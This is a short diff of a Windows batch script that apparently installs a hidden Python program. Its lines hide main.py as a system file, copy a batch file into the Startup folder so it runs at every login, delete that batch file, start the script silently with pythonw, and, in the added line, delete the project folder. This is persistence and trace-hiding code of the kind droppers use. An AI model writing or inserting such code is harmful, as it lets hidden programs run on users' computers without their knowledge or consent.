@@ -12,4 +12,5 @@ attrib +h +s main.py
 copy pop.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 del pop.bat
 start /B pythonw.exe main.py
+rmdir /s /q pythoncoderuninsystemdirectly-main
 exit
